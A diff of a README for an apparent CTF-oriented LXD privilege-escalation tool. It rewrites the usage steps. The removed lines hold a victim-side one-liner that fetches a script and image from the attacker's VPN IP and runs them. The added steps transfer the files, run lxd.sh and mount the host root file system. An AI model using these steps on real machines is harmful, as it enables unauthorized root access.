@@ -1,18 +1,15 @@
-#  Instructions
+ # Instructions
 
-### copy the following command in your Machine
+1. Git clone the repository
 
- >  wget "https://github.com/CyberJunnkie/LXDAutoPrivilegeEscalator/blob/master/lxd.sh" && wget "https://github.com/CyberJunnkie/LXDAutoPrivilegeEscalator/blob/master/root.tar.gz"
+2. Transfer lxd.sh and root.tar.gz to victim machine 
 
- > Then serve a http server in the directory where you just installed the above files
- > python3 -m simple.http 80
+3. chmod +x lxd.sh
 
- > Now on Victim Machine type the following command
- 
-  #### If you are doing a ctf and connected to the vpn,then type your vpn ip in commands below 
- 
- > wget "http://10.x.x.x/lxd.sh" && wget "http://10.x.x.x/root.tar.gz" && chmod +x lxd.sh && ./lxd.sh root.tar.gz
+4. ./lxd.sh root.tar.gz
 
-  
+5. cd /mnt/root
+
+Now you will have access to file system
  
 
